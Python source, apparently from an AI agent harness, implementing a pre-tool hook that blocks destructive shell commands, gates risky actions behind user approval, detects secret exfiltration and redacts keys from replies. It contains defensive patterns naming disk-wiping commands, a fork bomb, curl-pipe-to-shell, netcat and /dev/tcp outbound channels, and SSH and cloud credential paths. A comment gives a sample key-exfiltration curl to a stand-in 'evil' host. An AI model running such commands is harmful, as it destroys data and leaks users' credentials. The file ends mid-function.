"""危险命令拦截 —— PreToolUse hook,拦下真正毁灭性的 Bash 命令。

vococo 默认 bypassPermissions(工具自动执行),方便但有风险。这里加一道
**保守的安全网**:只拦真正会造成灾难的命令(删整个根/家目录、格式化磁盘、覆写裸盘、
fork 炸弹等),宁可漏放也别误伤日常操作——`rm -rf ./build` 这种子目录删除【不拦】。

被拦时返回 permissionDecision=deny,agent 收到拒绝原因,可改用更安全的方式或让用户手动执行。
想关掉:.env 里 DANGER_GUARD=0。

除「灾难级 → 直接拦」外,这里还做一层【审批闸】(APPROVAL_GATE,默认开):对
「危险但非灾难」的操作 —— 写工作目录外的文件、git push / reset --hard、rm -rf、
包安装(pip/npm/brew…)、curl|sh、进程终止 —— 在【有交互通道时】弹按钮请用户批准。
这就是「远程编码:动手前对齐」的安全阀,复刻 Claude Code 的权限体验但适配手机低摩擦。
"""
from __future__ import annotations

import contextvars
import os
import re
import shlex

from .. import config

try:  # HookMatcher 用于把本 hook 挂进 SDK;旧 SDK 缺失则优雅降级(不挂 hook)
    from claude_agent_sdk import HookMatcher
except Exception:  # pragma: no cover
    HookMatcher = None

# 灾难目标:整个根 / 整个家目录 / 根通配(而非某个子目录)
_CATASTROPHIC_TARGET = re.compile(r"(^|\s)(/|/\*|~|~/|\$HOME|\$HOME/|\*)(\s|$)")

# 其余灾难级模式(literal)。注:黑名单是「减速带」不是「安全边界」——枚举永远不完整,
# 真正的防线是边界 fail-closed + 缩小注入爆炸半径(见 安全策略优化方案.md)。这里只补
# 「一眼灾难、日常绝不会误伤」的少数模式,提高门槛而已。
_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r"\bmkfs(\.\w+)?\b"), "格式化文件系统"),
    (re.compile(r"\bdd\b[^\n]*\bof=/dev/(disk|sd|nvme|rdisk)"), "dd 写裸磁盘"),
    (re.compile(r">\s*/dev/(sd|nvme|disk|rdisk)"), "覆写裸磁盘"),
    (re.compile(r":\s*\(\s*\)\s*\{.*[|&].*\}\s*;"), "fork 炸弹"),
    (re.compile(r"\bchmod\s+-R\s+0*777\s+/(\s|$)"), "chmod -R 777 根目录"),
    # 解释器内置删根/家目录:python -c "import shutil; shutil.rmtree('/')" 之类
    (re.compile(r"\b(shutil\.rmtree|os\.removedirs)\s*\(\s*['\"](/|~|\$HOME)['\"/]"),
     "解释器删根/家目录"),
]

# find 删整树:必须同时 ①是 find ②带 -delete ③目标是灾难级(根/家目录/根通配),复用
# 已验证的 _CATASTROPHIC_TARGET,避免 "find /tmp -delete"、"find ./x -delete" 被误伤。
_FIND_DELETE = re.compile(r"\bfind\b")
_HAS_DELETE = re.compile(r"\s-delete\b")


def _find_is_catastrophic(cmd: str) -> bool:
    return bool(
        _FIND_DELETE.search(cmd)
        and _HAS_DELETE.search(cmd)
        and _CATASTROPHIC_TARGET.search(cmd)
    )


def _rm_is_catastrophic(cmd: str) -> bool:
    """rm + 递归标志 + 灾难目标(整根/整家目录/根通配)才算灾难;删子目录不算。"""
    if not re.search(r"\brm\s+(-\S*[rR])", cmd):  # 必须带递归
        return False
    # 去掉 rm 及其后的选项,只看目标部分是否命中灾难目标
    return bool(_CATASTROPHIC_TARGET.search(cmd))


def is_dangerous(command: str) -> str | None:
    """返回命中的危险说明,安全则返回 None。"""
    c = (command or "").strip()
    if not c:
        return None
    if _rm_is_catastrophic(c):
        return "rm -r 删整个根/家目录"
    if _find_is_catastrophic(c):
        return "find 删整树(根/家目录)"
    for rx, why in _PATTERNS:
        if rx.search(c):
            return why
    return None


async def pretool_danger_hook(input_data, tool_use_id, context):
    """PreToolUse hook:对 Bash 命令做危险拦截。返回 deny 则该次工具调用被拒。"""
    try:
        if input_data.get("tool_name") != "Bash":
            return {}
        cmd = (input_data.get("tool_input") or {}).get("command", "")
        why = is_dangerous(cmd)
        if why:
            return {
                "hookSpecificOutput": {
                    "hookEventName": "PreToolUse",
                    "permissionDecision": "deny",
                    "permissionDecisionReason": (
                        f"⛔ 危险命令被 {config.PERSONA_NAME} 拦截({why})。如确需执行,请你手动在终端运行,"
                        "或改用更安全的方式。"
                    ),
                }
            }
    except Exception:
        pass  # hook 出错不阻断正常流程
    return {}


# ── 审批闸:「危险但非灾难」操作 → 有交互通道时请用户批准 ───────────────────
# 都是命令级(Bash)的模式;「写工作目录外文件」是文件级,单独在 classify 里判。
# 第三个元素 restrict_noninteractive:非交互通道(cron/eval,无人可点审批)是否直接拒绝。
# 只对「对外/供应链/改环境」这三类置 True(push/装包/curl|sh)——它们在自动化里被注入
# 后果最重;rm -rf / reset 是本地操作,自动化里放行(避免卡住日常定时任务)。
_ESCALATE_BASH: list[tuple[re.Pattern, str, bool]] = [
    (re.compile(r"\bgit\s+push\b"), "git push(推送到远端,对外)", True),
    (re.compile(r"\bgit\s+reset\b[^\n]*--hard\b"), "git reset --hard(丢弃改动,不可逆)", False),
    (re.compile(r"\brm\s+-\S*[rR]"), "rm -rf(递归删除)", False),
    (
        re.compile(
            r"\b(pip3?|pipx|uv|npm|pnpm|yarn|brew|apt|apt-get|gem|cargo|go)\s+"
            r"(install|add|get|i)\b"
        ),
        "包安装(改动环境)",
        True,
    ),
    (re.compile(r"\b(curl|wget)\b[^\n]*\|\s*(sudo\s+)?(sh|bash|zsh)\b"),
     "curl|sh(下载执行,供应链风险)", True),
]

# 密钥外带的定向拦截:命令里【同时】出现敏感变量名 + 外带渠道 → 疑似把 key 送出去。
# ANTHROPIC_API_KEY(第三方 provider key)和 CLAUDE_CODE_OAUTH_TOKEN(官方订阅 token,
# core/agent.py:_turn_env 每轮显式注入,CLI 子进程认证要用)是两个无法从 CLI 子进程 env
# 移除的敏感值,这条专挡「curl evil?k=$ANTHROPIC_API_KEY」这类最直白的外带。其余变量名
# 即使已被 config._scrub_env_secrets 清空,列进来也无害(scrub 若被 VOCOCO_KEEP_ENV_SECRETS
# 关掉时兜底)。
# 这不是边界:base64/写文件再传/间接引用都能绕;只抬高门槛。日常命令几乎不会命中,误伤极低。
_SECRET_VAR_RE = re.compile(
    r"ANTHROPIC_AUTH_TOKEN|ANTHROPIC_API_KEY|CLAUDE_CODE_OAUTH_TOKEN|"
    r"SILICONFLOW_API_KEY|VAPID_PRIVATE_KEY|WEB_AUTH_TOKEN"
)
_OUTBOUND_RE = re.compile(r"\b(curl|wget|nc|ncat|telnet|ssh|scp)\b|/dev/tcp/")

_PROCESS_CONTROL_COMMANDS = {"kill", "pkill", "killall"}
_VOCOCO_PROCESS_TARGET = re.compile(r"\bvococo(?:\s+serve)?\b")
_VOCOCO_SERVE_TARGET = re.compile(r"\bvococo\s+serve\b")
_PROCESS_QUERY_COMMANDS = {"pgrep", "ps"}
_SHELLS = {"sh", "bash", "zsh"}
_ASSIGNMENT = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=")
_QUERY_ASSIGNMENT = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=\$$")
_VARIABLE_REFERENCE = re.compile(
    r"\$(?:\{([A-Za-z_][A-Za-z0-9_]*)(?::?[-+?=][^}]*)?\}|"
    r"([A-Za-z_][A-Za-z0-9_]*))"
)
_SUDO_OPTIONS_WITH_VALUE = {
    "-C", "-D", "-g", "-h", "-p", "-R", "-r", "-T", "-t", "-u",
    "--chdir", "--close-from", "--group", "--host", "--other-user",
    "--prompt", "--role", "--type", "--user",
}
_ENV_OPTIONS_WITH_VALUE = {"-C", "-S", "-u", "--chdir", "--split-string", "--unset"}
_EXEC_OPTIONS_WITH_VALUE = {"-a"}
_XARGS_OPTIONS_WITH_VALUE = {
    "-a", "-d", "-E", "-I", "-J", "-L", "-n", "-P", "-s",
    "--arg-file", "--delimiter", "--eof", "--max-args", "--max-chars",
    "--max-lines", "--max-procs", "--replace",
}
_SHELL_PUNCTUATION = "|;&\n()"
_PIPE_OPERATORS = {"|", "|&"}
_REDIRECTION = re.compile(r"^\d*(?:>>?|<<?|<>|>&|<&)(.*)$")


def _shell_commands(command: str) -> list[list[str]]:
    """按语句切分 shell 文本;保留管道,引号内分隔符仍是普通文本。"""
    lexer = shlex.shlex(command, posix=True, punctuation_chars=_SHELL_PUNCTUATION)
    lexer.whitespace = " \t\r"
    lexer.whitespace_split = True
    lexer.commenters = "#"
    commands: list[list[str]] = [[]]
    for token in lexer:
        is_punctuation = token and all(char in _SHELL_PUNCTUATION for char in token)
        if is_punctuation and token not in _PIPE_OPERATORS and token not in {"(", ")"}:
            commands.append([])
        else:
            commands[-1].append(token)
    return [words for words in commands if words]


def _pipeline_stages(words: list[str]) -> list[list[str]]:
    stages: list[list[str]] = [[]]
    for word in words:
        if word in _PIPE_OPERATORS:
            stages.append([])
        else:
            stages[-1].append(word)
    return [stage for stage in stages if stage]


def _skip_options(words: list[str], index: int, options_with_value: set[str]) -> int:
    while index < len(words) and words[index].startswith("-"):
        option = words[index].split("=", 1)[0]
        index += 1
        if option == "--":
            break
        if option in options_with_value and "=" not in words[index - 1]:
            index += 1
    return index


def _unwrap_command(words: list[str]) -> list[str]:
    index = 0
    while index < len(words):
        if words[index] in {"(", ")"}:
            index += 1
            continue
        if _ASSIGNMENT.match(words[index]):
            index += 1
            continue
        executable = os.path.basename(words[index])
        if executable == "sudo":
            index = _skip_options(words, index + 1, _SUDO_OPTIONS_WITH_VALUE)
        elif executable == "env":
            index = _skip_options(words, index + 1, _ENV_OPTIONS_WITH_VALUE)
            while index < len(words) and _ASSIGNMENT.match(words[index]):
                index += 1
        elif executable == "command":
            index = _skip_options(words, index + 1, set())
        elif executable == "exec":
            index = _skip_options(words, index + 1, _EXEC_OPTIONS_WITH_VALUE)
        else:
            break
    return words[index:]


def _xargs_command(words: list[str]) -> list[str]:
    index = _skip_options(words, 1, _XARGS_OPTIONS_WITH_VALUE)
    return _unwrap_command(words[index:])


def _shell_script(words: list[str]) -> str | None:
    if not words or os.path.basename(words[0]) not in _SHELLS:
        return None
    for index, option in enumerate(words[1:], start=1):
        has_command = option == "-c" or (
            option.startswith("-") and not option.startswith("--") and "c" in option[1:]
        )
        if has_command and index + 1 < len(words):
            return words[index + 1]
        if not option.startswith("-"):
            break
    return None


def _stage_directly_controls_process(stage: list[str]) -> bool:
    words = _unwrap_command(stage)
    if not words:
        return False
    if os.path.basename(words[0]) == "xargs":
        invoked = _xargs_command(words)
        return _is_terminating_process_command(invoked)
    return _is_terminating_process_command(words)


def _is_terminating_process_command(words: list[str]) -> bool:
    if not words:
        return False
    executable = os.path.basename(words[0])
    if executable not in _PROCESS_CONTROL_COMMANDS:
        return False
    if executable != "kill":
        return True
    args = words[1:]
    if args and args[0] in {"-0", "-l", "-L"}:
        return False
    return len(args) < 2 or args[:2] not in (["-s", "0"], ["--signal", "0"])


def _stage_shell_script(stage: list[str]) -> str | None:
    words = _unwrap_command(stage)
    if words and os.path.basename(words[0]) == "xargs":
        words = _xargs_command(words)
    return _shell_script(words)


def _command_substitutions(words: list[str]) -> list[str]:
    substitutions: list[str] = []
    for index in range(len(words) - 2):
        if words[index:index + 2] != ["$", "("]:
            continue
        try:
            end = words.index(")", index + 2)
        except ValueError:
            continue
        substitutions.append(" ".join(words[index + 2:end]))
    return substitutions


def _without_redirections(words: list[str]) -> list[str]:
    result: list[str] = []
    skip_target = False
    for word in words:
        if skip_target:
            skip_target = False
            continue
        match = _REDIRECTION.match(word)
        if match:
            skip_target = not bool(match.group(1))
            continue
        result.append(word)
    return result


def _statement_queries_vococo(statement: list[str]) -> bool:
    if not _VOCOCO_SERVE_TARGET.search(" ".join(_without_redirections(statement))):
        return False
    for stage in _pipeline_stages(statement):
        words = _unwrap_command(stage)
        if words and os.path.basename(words[0]) in _PROCESS_QUERY_COMMANDS:
            return True
    return False


def _query_output_variables(statement: list[str]) -> set[str]:
    if not _statement_queries_vococo(statement):
        return set()
    return {
        match.group(1)
        for word in statement
        if (match := _QUERY_ASSIGNMENT.match(word))
    }


def _assigned_variables(statement: list[str]) -> set[str]:
    return {
        match.group(1)
        for word in statement
        if (match := _ASSIGNMENT.match(word))
    }


def _referenced_variables(statement: list[str]) -> set[str]:
    references: set[str] = set()
    for word in statement:
        for match in _VARIABLE_REFERENCE.finditer(word):
            references.add(match.group(1) or match.group(2))
    return references


def _statement_terminates_process(statement: list[str]) -> bool:
    return any(
        _stage_directly_controls_process(stage)
        for stage in _pipeline_stages(statement)
    )


def _is_process_control(command: str) -> bool:
    """是否实际调用 kill/pkill/killall 或让 xargs 执行它们。"""
    for statement in _shell_commands(command):
        if any(_is_process_control(cmd) for cmd in _command_substitutions(statement)):
            return True
        for stage in _pipeline_stages(statement):
            if _stage_directly_controls_process(stage):
                return True
            script = _stage_shell_script(stage)
            if script and _is_process_control(script):
                return True
    return False


def _targets_vococo_process(command: str) -> bool:
    query_variables: set[str] = set()
    for statement in _shell_commands(command):
        query_variables.difference_update(_assigned_variables(statement))
        query_variables.update(_query_output_variables(statement))
        uses_query_output = query_variables & _referenced_variables(statement)
        if uses_query_output and _statement_terminates_process(statement):
            return True
        if any(
            _targets_vococo_process(cmd) for cmd in _command_substitutions(statement)
        ):
            return True
        stages = _pipeline_stages(statement)
        for stage in stages:
            if not _stage_directly_controls_process(stage):
                continue
            words = _unwrap_command(stage)
            target_scope = statement if os.path.basename(words[0]) == "xargs" else stage
            target_args = _without_redirections(target_scope)
            if _VOCOCO_PROCESS_TARGET.search(" ".join(target_args)):
                return True
        for stage in stages:
            script = _stage_shell_script(stage)
            if script and _targets_vococo_process(script):
                return True
    return False


def _looks_like_secret_exfil(cmd: str) -> bool:
    return bool(_SECRET_VAR_RE.search(cmd) and _OUTBOUND_RE.search(cmd))


# 会改写文件系统的工具 → 检查目标是否落在工作目录外
_WRITE_TOOLS = {"Write", "Edit", "MultiEdit", "NotebookEdit"}

# 外部 MCP 写操作白名单:命中 → escalate 请批准(cron/无交互通道直接拒)。
# 与精简 MCP 的全部远端改写工具一一对应,新增写工具时这里同步加。
_MCP_WRITE_TOOLS = frozenset({
    "mcp__lemlist_lite__send_email",
    "mcp__lemlist_lite__add_campaign_lead",
    "mcp__lemlist_lite__delete_campaign_lead",
    "mcp__lemlist_lite__upsert_contact",
    "mcp__lemlist_lite__delete_contact",
})

# 当前轮的工作目录(工作目录功能会在开轮时 set_cwd;未设则 None → 越界检查休眠)
_cwd_var: contextvars.ContextVar = contextvars.ContextVar("vococo_agent_cwd", default=None)
# 项目根目录(主仓库):worktree 会话的 cwd 在子目录,但主仓库也是"自己项目",不该弹审批
_project_root_var: contextvars.ContextVar = contextvars.ContextVar(
    "vococo_project_root", default=None
)


def set_cwd(path: str | None, project_root: str | None = None) -> tuple:
    """开轮时登记本轮工作目录 + 项目根(供越界写检测)。converse 每轮调用。

    project_root: worktree 会话的主仓库路径,让审批闸把仓库文件也视为「项目内」。
    返回 (cwd_token, proot_token) 元组,用完传回 reset_cwd 清理。
    """
    return (
        _cwd_var.set(path or None),
        _project_root_var.set(project_root or None),
    )


def reset_cwd(tokens: tuple) -> None:
    """还原 set_cwd 设置的两个 contextvar。"""
    cwd_tok, proot_tok = tokens
    try:
        _cwd_var.reset(cwd_tok)
    except (ValueError, LookupError):
        pass
    try:
        _project_root_var.reset(proot_tok)
    except (ValueError, LookupError):
        pass


def current_cwd() -> str | None:
    return _cwd_var.get()


def _outside_cwd(path: str, cwd: str | None) -> bool:
    """目标文件是否落在 cwd 之外(含符号链接解析)。cwd 为空则不判(休眠)。

    注:worktree 会话写「主仓库内、worktree 外」的越界不在这里放行,改由
    _writes_outside_worktree 单独【硬拦】(常开正确性防线)。这里只判「是否在 cwd 外」,
    彻底在项目之外的写入交 escalate 请批准。
    """
    if not cwd or not path:
        return False
    try:
        target = os.path.realpath(os.path.join(cwd, os.path.expanduser(path)))
        base = os.path.realpath(cwd)
        return os.path.commonpath([target, base]) != base
    except (ValueError, OSError):
        return False


def _inside_ai_brain(path: str, cwd: str | None) -> bool:
    """目标文件是否落在 AI_BRAIN_DIR 内(含符号链接解析)。"""
    if not path:
        return False
    try:
        target = os.path.realpath(os.path.join(cwd or "", os.path.expanduser(path)))
        brain_base = os.path.realpath(config.AI_BRAIN_DIR)
        return os.path.commonpath([target, brain_base]) == brain_base
    except (ValueError, OSError):
        return False


def classify(
    tool_name: str, tool_input: dict, cwd: str | None = None
) -> tuple[str, str, bool]:
    """把一次工具调用分成 allow / escalate / block,附(原因, 非交互是否拒绝)。

    - block:灾难级(删根/格式化…),直接拦。
    - escalate:危险但非灾难的操作,请用户批准。
    - allow:其余,放行。

    第三个返回值 restrict_noninteractive:该 escalate 操作在无交互通道(cron/eval)时
    是否应默认拒绝(fail-closed)。allow/block 场景恒为 False(无意义)。
    """
    ti = tool_input or {}
    if tool_name == "Bash":
        cmd = ti.get("command", "") or ""
        why = is_dangerous(cmd)
        if why:
            return ("block", why, False)
        if _is_process_control(cmd):
            return ("escalate", "进程终止命令(kill/pkill/killall)", True)
        if _looks_like_secret_exfil(cmd):
            # 疑似把密钥外带:自动化通道直接拒(restrict=True),有交互通道则请你确认
            return ("escalate", "疑似把密钥/令牌通过网络外带", True)
        for rx, reason, restrict in _ESCALATE_BASH:
            if rx.search(cmd):
                return ("escalate", reason, restrict)
        return ("allow", "", False)
    if tool_name in _WRITE_TOOLS:
        path = ti.get("file_path") or ti.get("notebook_path") or ""
        # AI_BRAIN 是 vococo 正常记忆目录,虽在项目根外,但不应每次弹审批
        if path and _inside_ai_brain(path, cwd):
            return ("allow", "", False)
        if _outside_cwd(path, cwd):
            # 写工作目录外:自动化通道也拒绝(可能被注入用来落地后门/改配置)
            return ("escalate", f"写工作目录外的文件({path})", True)
    # 外部 MCP 的写操作(lemlist-lite 等):会实际发邮件/删改数据,默认请批准
    # ——防止 agent 误调或 prompt injection 借它群发/删数据;cron 等无交互通道直接拒。
    if tool_name in _MCP_WRITE_TOOLS:
        return ("escalate", f"{tool_name} 是外部写操作(会实际发送/修改数据)", True)
    return ("allow", "", False)


# ── 敏感读取标注:读到明显的凭据类文件时只打日志,不拦(安全评估 P0-1) ──────────
# 现状缺口:_WRITE_TOOLS 越界检查只管「写」,Read/Bash 的「读」完全没有边界——一次
# prompt injection 就能让 agent 去读 ~/.ssh 私钥、云厂商凭据,而不会被拦下或留痕。
# 这里先补一道最低成本的观测:命中就 print 一行,不拦截(这类文件在正常运维里也会
# 被合法读到,拦截误伤面太大)。真正兜底靠下面的 redact_secrets(输出侧最后一道)。
_SENSITIVE_READ_TARGET = re.compile(
    r"/\.ssh/(?!.*\.pub$)(id_\w+|[\w.-]*_rsa|[\w.-]*_dsa|[\w.-]*_ed25519|[\w.-]*_ecdsa)\b"
    r"|/\.aws/credentials\b"
    r"|/\.config/gcloud/"
    r"|/\.netrc\b"
    r"|\.(pem|p12|pfx)\b"
)


def _sensitive_read_target(tool_name: str, tool_input: dict) -> str | None:
    """本次调用是否在读取明显的凭据类文件(SSH 私钥/云凭据/证书);命中则返回目标。"""
    ti = tool_input or {}
    if tool_name == "Read":
        path = ti.get("file_path") or ""
        return path if path and _SENSITIVE_READ_TARGET.search(path) else None
    if tool_name == "Bash":
        cmd = ti.get("command", "") or ""
        return cmd[:200] if _SENSITIVE_READ_TARGET.search(cmd) else None
    return None


# ── 输出侧敏感内容过滤:回复发出前的最后一道扫描(安全评估 P0-2) ─────────────────
# 现状缺口:就算上面那道读取被标注了,agent 把读到的内容原样写进回复文本里,此前
# 没有任何一层会检查"这条回复是不是带了私钥/token"。两层过滤:
#  ① 精确匹配我们自己当前持有的 secret 字面值(来自 config/providers)——零误伤,
#    100% 覆盖"自己的密钥被读出来又说出去"这条最直接的路径。
#  ② 通用形状规则(SSH/PEM 私钥块、常见云厂商 token 前缀)——兜底覆盖用户机器上
#    其他服务的凭据,这些我们没有字面值可比对。
# 这仍是 trip wire 不是边界:流式分片可能把一个 token 切成两半从而漏过一次(接入点
# 在 gateway/core.py converse() 里,对累积文本做扫描,而非逐个 delta,已尽量降低
# 被切开的概率);真正兜底仍是上面那道"别让 agent 读到不该读的东西"。
_SECRET_SHAPE_PATTERNS: list[re.Pattern] = [
    re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----"),
    re.compile(r"\bAKIA[0-9A-Z]{16}\b"),  # AWS access key id
    re.compile(r"\bgh[pousr]_[A-Za-z0-9]{20,}\b"),  # GitHub 各类 token
    re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b"),  # Slack token
    re.compile(r"\bsk-ant-[A-Za-z0-9-]{20,}\b"),  # Anthropic key
]

_REDACTED = "[已拦截:疑似密钥]"


def _known_secret_values() -> list[str]:
    """当前持有的自用 secret 字面值(供精确匹配)。长度<8 的不参与,误伤面太大。"""
    vals = [
        config.OAUTH_TOKEN,
        config.STT_API_KEY,
        config.VAPID_PRIVATE_KEY,
        config.WEB_AUTH_TOKEN,
    ]
    try:
        from ..gateway import settings_store

        for p in settings_store.list_web_providers():
            key = p.get("api_key")
            if isinstance(key, str) and len(key) >= 8:
                vals.append(key)
    except Exception:
        pass
    return [v for v in vals if v and len(v) >= 8]


def redact_secrets(text: str) -> str:
    """回复文本发出前的最后一道扫描:命中已知密钥字面值/常见密钥形状则打码。"""
    if not text:
        return text
    out = text
    for val in _known_secret_values():
        if val in out:
            out = out.replace(val, _REDACTED)
    for rx in _SECRET_SHAPE_PATTERNS:
        out = rx.sub(_REDACTED, out)
    return out


def _deny(reason: str) -> dict:
    return {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "deny",
            "permissionDecisionReason": reason,
        }
    }


# ── 强制前台执行:拦下 run_in_background,引导模型改前台重试 ────────────────────
# 本 harness 每轮用一个 ClaudeSDKClient,收到【本轮 ResultMessage】就退出 receive_response
# 并关闭子进程。而 run_in_background 的子代理/命令是「立即返回、真正干活排到 ResultMessage
# 之后以 task_* 系统消息陆续上报」—— 届时子进程已被关掉,任务被腰斩:模型嘴上说「已在后台
# 发起」,实际一步没跑,也没有任何结果/显示。
# 修法:PreToolUse hook 检测到 run_in_background=true 就 deny,并在原因里明确要求【去掉该
# 参数、以前台(同步)方式重新调用】。deny 是 hook 的硬拦截(危险命令拦截同款,bypassPermissions
# 下也生效);相比 updatedInput 改写入参(疑似在 bypass 模式被 CLI 忽略),deny 更可靠。
# 模型重试为前台后,子代理会在本轮内跑完并靠既有子代理卡片实时显示。
# 子代理工具新版叫 Agent、老版叫 Task,两者都收;Bash 也有 run_in_background。
_BACKGROUNDABLE = {"Agent", "Task", "Bash"}


def _wants_background(tool_name: str, tool_input: dict) -> bool:
    """该工具调用是否请求了后台执行(run_in_background=true)。"""
    if tool_name not in _BACKGROUNDABLE:
        return False
    return bool((tool_input or {}).get("run_in_background"))


def _deny_background(tool_name: str) -> dict:
    return _deny(
        f"🚫 本 harness【不支持后台任务】(run_in_background):后台任务会在本轮结束时被中断、"
        f"永远跑不完,也没有任何结果。请【去掉 run_in_background 参数】,以【前台(同步)】方式"
        f"重新调用 {tool_name}——前台子代理会在本轮内跑完并实时显示进度。"
    )


# ── 记忆孤本防线:禁止在 ~/.claude/projects/*/memory/ 新建实体文件 ─────────────────
# 记忆唯一主库在 ~/AI_BRAIN/memory(见 AI_BRAIN 的 memory-source-unified 记忆):Claude Code
# 项目记忆目录里只放指向主库的软链。agent 直接在该目录 Write 新文件会重新制造两边分叉的
# 孤本,故一律 deny 并引导「先写 AI_BRAIN 再 ln -s」。写已有文件不拦——软链写穿主库、
# MEMORY.md 索引更新都属正常操作。与 run_in_background 拦截同为常开的正确性防线,
# 不受 DANGER_GUARD / APPROVAL_GATE 开关控制。
_CLAUDE_PROJECTS_DIR = os.path.expanduser("~/.claude/projects")


def _creates_orphan_memory_file(tool_name: str, tool_input: dict) -> str | None:
    """若本次调用会在 Claude Code 项目记忆目录里新建实体文件,返回目标路径;否则 None。"""
    if tool_name not in _WRITE_TOOLS:
        return None
    ti = tool_input or {}
    path = ti.get("file_path") or ti.get("notebook_path") or ""
    if not path:
        return None
    try:
        target = os.path.abspath(os.path.expanduser(path))
        rel = os.path.relpath(target, _CLAUDE_PROJECTS_DIR)
        parts = rel.split(os.sep)
        # 形如 <项目槽>/memory/<file> 才算记忆目录;越出 projects 根(..开头)不算
        if rel.startswith("..") or len(parts) < 3 or parts[1] != "memory":
            return None
        if os.path.lexists(target):
            return None  # 已有文件/软链:写穿主库,放行
        return target
    except (ValueError, OSError):
        return None


def _deny_orphan_memory(target: str) -> dict:
    return _deny(
        f"🚫 记忆唯一主库在 ~/AI_BRAIN/memory/,Claude Code 项目记忆目录只放软链,"
        f"禁止在其中新建实体文件({target})。请改为:1) 把内容 Write 到"
        f" ~/AI_BRAIN/memory/<同名>.md;2) `ln -s` 该文件到项目记忆目录;"
        f"3) 更新该目录的 MEMORY.md 索引(索引是已有文件,可直接改)。"
    )


# ── worktree 越界防线:禁止 worktree 会话写到 worktree 外的共享主仓库 ──────────────
# worktree 会话的 cwd 是独立 worktree(≠ 主仓库根),改动本该留在自己 worktree 里、
# 提交后合回 main。若直接写主仓库工作区(worktree 外),会撕破会话隔离——落到别的会话
# 共享的主仓库/main,且绕过分支与提交。故一律 deny(与 run_in_background、记忆孤本同为
# 常开正确性防线,不受 DANGER_GUARD/APPROVAL_GATE 开关控制)。回退会话 cwd==主仓库根,
# 天然不触发;AI_BRAIN 记忆目录豁免。worktree 恰好嵌在主仓库 data/ 下,故「主仓库内且
# worktree 内」的正常写不会命中。
def _writes_outside_worktree(
    tool_name: str, tool_input: dict, cwd: str | None
) -> tuple[str, str] | None:
    """worktree 会话写 worktree 外、主仓库内 → 返回 (目标绝对路径, worktree 根);否则 None。"""
    if tool_name not in _WRITE_TOOLS or not cwd:
        return None
    proot = _project_root_var.get()
    if not proot:
        return None
    ti = tool_input or {}
    path = ti.get("file_path") or ti.get("notebook_path") or ""
    if not path or _inside_ai_brain(path, cwd):
        return None
    try:
        base = os.path.realpath(cwd)
        pbase = os.path.realpath(proot)
        if base == pbase:
            return None  # 非 worktree / 回退会话:cwd 就是主仓库根,不由本防线管
        target = os.path.realpath(os.path.join(cwd, os.path.expanduser(path)))
        in_wt = os.path.commonpath([target, base]) == base
        in_repo = os.path.commonpath([target, pbase]) == pbase
        if in_repo and not in_wt:
            return (target, base)
    except (ValueError, OSError):
        return None
    return None


def _deny_outside_worktree(target: str, wt: str) -> dict:
    return _deny(
        f"🚫 该路径在会话 worktree 外(共享主仓库),拒绝写入({target})。worktree 会话的"
        f"改动必须留在自己的 worktree 里、提交后再合回 main——请改写 worktree 内的对应文件"
        f"(worktree 根:{wt})。"
    )


def _deny_vococo_process_control() -> dict:
    return _deny(
        "🚫 禁止直接控制 vococo 正式进程。会话内重启请使用 restart_self；"
        "终端或外部场景请使用 `zsh deploy/restart.sh` 或 `zsh deploy/stop.sh`。"
    )


def _hard_guard(tool_name: str, tool_input: dict, cwd: str | None) -> dict | None:
    """常开正确性防线:正式进程控制等错误操作命中后直接返回 deny。

    这是跟下面 classify() 的 allow/escalate/block 三档【并列的另一套机制】,不是它的
    第四档:这些规则修的是正确性 bug(不这么做程序行为就是错的),不是「操作有多危险」,
    所以永远生效、不受 DANGER_GUARD / APPROVAL_GATE 开关影响——关掉安全开关图的是
    「我知道风险,别再问我」,不该连带关掉这几条「关了程序就会错」的防线。
    CONTEXT.md「危险分级(Risk Tier)」条目描述的三档模型专指 classify() 的输出。
    """
    if tool_name == "Bash" and _targets_vococo_process(
        (tool_input or {}).get("command", "") or ""
    ):
        return _deny_vococo_process_control()
    if _wants_background(tool_name, tool_input):
        return _deny_background(tool_name)
    orphan = _creates_orphan_memory_file(tool_name, tool_input)
    if orphan:
        return _deny_orphan_memory(orphan)
    outside = _writes_outside_worktree(tool_name, tool_input, cwd)
    if outside:
        return _deny_outside_worktree(*outside)
    return None


def _describe(tool_name: str, tool_input: dict) -> str:
    """给审批弹窗一行「具体要干什么」。

    只覆盖 Bash 和 _WRITE_TOOLS 两种——classify() 目前只对这两类工具返回
    escalate/block(见上方 classify() 实现),其余工具永远 allow、走不到审批,
    所以下面的兜底分支目前不可达。这不是覆盖不全,是跟 classify() 的判定范围
    严格对齐;哪天 classify() 扩到其他工具类型也要 escalate,记得回来加对应分支
    ——tests/test_danger.py::test_describe_covers_every_escalatable_tool 会在
    那种情况下失败提醒(2026-07-23 架构复盘:此前误以为这是「审批弹窗渲染比
    实时 Tool Card 弱」的覆盖缺口,实际两者服务不同目的,详见该测试的说明)。
    """
    ti = tool_input or {}
    if tool_name == "Bash":
        return f"`{(ti.get('command') or '').strip()[:200]}`"
    if tool_name in _WRITE_TOOLS:
        return f"→ {ti.get('file_path') or ti.get('notebook_path') or '?'}"
    return tool_name


def _is_group_session(session_key: str) -> bool:
    """群聊会话(TG 群 chat_id 为负 → key 形如 tg:-123)。群里危险操作不许自批。"""
    return bool(session_key) and session_key.startswith("tg:")


# ── 「本次会话都允许」记忆:选了这项的会话,后续同类 escalate 免批直接放行 ─────────
# 按 session_key 隔离(群聊会话不参与——群里从不弹审批,见 _approve 群聊直接拒);
# 进程内存,会话删除时由 clear_session_approvals 清掉。
# category 用 reason 归一化后的稳定标签:越界写的 reason 带具体路径,须剥成类别,
# 否则换个文件就得重批;其余 escalate 的 reason 本身固定,直接拿来当键。
_session_approvals: dict[str, set[str]] = {}


def _category(reason: str) -> str:
    """把审批原因归一成稳定类别键(供「本次会话都允许」按类记忆)。"""
    if reason.startswith("写工作目录外的文件"):
        return "write_outside_cwd"
    return reason


def _is_session_approved(session_key: str | None, category: str) -> bool:
    return bool(session_key) and category in _session_approvals.get(session_key, set())


def _mark_session_approved(session_key: str, category: str) -> None:
    _session_approvals.setdefault(session_key, set()).add(category)


def clear_session_approvals(session_key: str) -> None:
